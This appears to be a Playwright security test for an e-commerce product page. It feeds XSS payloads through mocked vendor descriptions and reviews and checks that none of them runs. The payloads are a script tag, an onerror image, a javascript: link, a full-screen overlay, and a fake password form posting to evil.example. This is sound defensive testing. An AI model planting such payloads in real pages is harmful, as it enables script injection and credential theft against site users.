import { expect, test } from "@playwright/test";

import { MockApi } from "./mock-api";

// FE-06: vendor/scraped description HTML and buyer review text cannot run
// code, imitate a form or open links with access to this page.

test("descriptions and reviews are shown as safe content", async ({ page }) => {
  const api = new MockApi();
  await api.install(page);
  const productId = "00000000-0000-4000-8000-000000000060";
  api.products.set("ao-thun", {
    id: productId,
    vendor_id: "00000000-0000-4000-8000-000000000080",
    category_id: "00000000-0000-4000-8000-000000000090",
    name: "Áo thun thử nghiệm",
    slug: "ao-thun",
    description: [
      "<p>Chất liệu cotton</p>",
      "<script>window.__xss = 'script'</script>",
      '<img src="x" onerror="window.__xss = \'img\'">',
      '<form action="https://evil.example/steal"><input type="password" name="pw"><button>Đăng nhập</button></form>',
      "<a href=\"javascript:window.__xss='link'\">Bấm vào đây</a>",
      '<a href="https://example.com/size">Bảng size</a>',
      '<p style="position:fixed;inset:0">phủ màn hình</p>',
    ].join(""),
    price_amount: 120_000,
    currency: "VND",
    status: "approved",
    is_active: true,
    created_at: new Date().toISOString(),
    updated_at: new Date().toISOString(),
  });
  api.reviews.set(productId, [
    {
      id: "00000000-0000-4000-8000-000000000099",
      buyer_name: "N***n",
      product_id: productId,
      rating: 5,
      comment: "<img src=x onerror=\"window.__xss='review'\"> rất tốt",
      verified_purchase: true,
      images: [],
      created_at: new Date().toISOString(),
    },
  ]);
  const dialogs: string[] = [];
  page.on("dialog", (d) => {
    dialogs.push(d.message());
    void d.dismiss();
  });

  await page.goto("/products/ao-thun");
  await expect(page.getByText("Chất liệu cotton")).toBeVisible();
  await expect(page.getByText(/<img src=x onerror=.*rất tốt/)).toBeVisible();
  await page.waitForTimeout(500);

  expect(
    await page.evaluate(() => (window as unknown as { __xss?: string }).__xss),
  ).toBeUndefined();
  expect(dialogs).toEqual([]);
  await expect(page.locator("form[action*='evil']")).toHaveCount(0);
  await expect(page.locator("input[type=password]")).toHaveCount(0);
  const unsafe = page.getByText("Bấm vào đây");
  await expect(unsafe).not.toHaveAttribute("href", /javascript/);
  const size = page.getByRole("link", { name: "Bảng size" });
  await expect(size).toHaveAttribute("rel", /noopener/);
  await expect(size).toHaveAttribute("target", "_blank");
  await expect(page.getByText("phủ màn hình")).not.toHaveAttribute("style", /fixed/);

  const headers = (await page.request.get("/products/ao-thun")).headers();
  expect(headers["x-frame-options"]).toBe("DENY");
  expect(headers["x-content-type-options"]).toBe("nosniff");
  expect(headers["x-powered-by"]).toBeUndefined();
});
